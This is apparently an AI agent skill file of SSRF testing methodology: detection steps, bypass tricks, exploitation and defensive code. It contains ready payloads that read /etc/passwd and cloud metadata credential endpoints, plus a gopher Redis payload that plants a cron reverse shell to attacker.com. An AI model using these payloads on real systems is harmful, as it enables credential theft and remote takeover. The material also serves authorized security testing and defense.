---
name: ssrf-testing
Description: Professional skills and methodology for SSRF server-side request forgery testing
version: 1.0.0
---

# SSRF server-side request forgery test

## Overview

SSRF (Server-Side Request Forgery) is a vulnerability that exploits server-initiated requests to access intranet resources, perform port scanning, or bypass firewalls. This skill provides methods for detecting, exploiting and protecting SSRF vulnerabilities.

## Vulnerability principle

The application accepts URL parameters and requests the URL, allowing the attacker to control the target of the request, resulting in:
- Intranet resource access
-Local file reading
- Port scan
- Bypass firewall
- Cloud service metadata access

## Test method

### 1. Identify SSRF input points

**Common features:**
- URL preview/screenshot
- File upload (remote URL)
- Webhook callback
- API proxy
- Data import
- Picture processing
- PDF generation

### 2. Basic detection

**Test local loopback:**
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
```

**Test intranet IP:**
```
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

**Test File Protocol:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

### 3. Bypass technology

**IP address encoding:**
```
127.0.0.1 → 2130706433 (decimal)
127.0.0.1 → 0x7f000001 (hex)
127.0.0.1 → 0177.0.0.1 (octal)
```

**Domain name resolution bypass:**
```
127.0.0.1.xip.io
127.0.0.1.nip.io
localtest.me
```

**URL Redirect:**
```
http://attacker.com/redirect → http://127.0.0.1
```

**Protocol Obfuscation:**
```
http://127.0.0.1:80@evil.com
http://evil.com#@127.0.0.1
```

## Leverage technology

### Intranet detection

**Port Scan:**
```bash
# Use Burp Intruder
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9200
```

**Identification Service:**
- Response time differences
- error message
- HTTP status code
- Response content

### Cloud service metadata

**AWS EC2：**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Google Cloud：**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

**Azure：**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```

**Alibaba Cloud:**
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Intranet application attack

**Visit the management background:**
```
http://127.0.0.1:8080/admin
http://192.168.1.100/phpmyadmin
```

**Redis Unauthorized Access:**
```
http://127.0.0.1:6379
# Then send the Redis command
```

**FastCGI Attack:**
```
http://127.0.0.1:9000
#Use the FastCGI protocol to execute commands
```

## Advanced Exploitation

### Gopher Protocol

**Send arbitrary protocol data:**
```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aquit%0d%0a
```

**Redis command execution:**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

### Dict Protocol

**Port Scanning and Information Collection:**
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:3306/status
```

### File protocol

**Read local file:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///proc/self/environ
```

## Tool usage

### SSRFmap

```bash
#Basic scan
python3 ssrfmap.py -r request.txt -p url

# port scan
python3 ssrfmap.py -r request.txt -p url -m portscan

# Cloud metadata
python3 ssrfmap.py -r request.txt -p url -m cloud
```

### Gopherus

```bash
# Generate Gopher payload
python gopherus.py --exploit redis
```

### Burp Collaborator

**Detection Blind SSRF:**
```
http://burpcollaborator.net
# Observe whether there are DNS/HTTP requests
```

## Validation and reporting

### Verification steps

1. Confirm that you can control the request target
2. Verify intranet resource access or port scanning
3. Assess the scope of impact (intranet penetration, data leakage, etc.)
4. Record a complete POC

### Report Highlights

- Vulnerability location and input parameters
- Accessible intranet resources or ports
- Complete exploitation steps and PoC
- Fix suggestions (URL whitelist, disable dangerous protocols, etc.)

## Protective measures

### Recommended plan

1. **URL Whitelist**
   ```python
   ALLOWED_DOMAINS = ['example.com', 'cdn.example.com']
   parsed = urlparse(url)
   if parsed.netloc not in ALLOWED_DOMAINS:
       raise ValueError("Domain not allowed")
   ```

2. **Disable dangerous protocols**
- Only http/https allowed
   - 禁止file:// , gopher://, dict://, etc.

3. **IP address filtering**
   ```python
   import ipaddress
   
   def is_internal_ip(ip):
       return ipaddress.ip_address(ip).is_private or \
              ipaddress.ip_address(ip).is_loopback
   ```

4. **Use DNS resolution verification**
-Resolve domain name to obtain IP
- Verify whether the IP is within the internal network range

5. **Network Isolation**
- Restrict server access to the Internet
- Use a proxy server

## Notes

- Only conducted in an authorized testing environment
- Avoid impact on intranet systems
- Pay attention to the support of different protocols
- Pay attention to the request frequency when testing to avoid triggering protection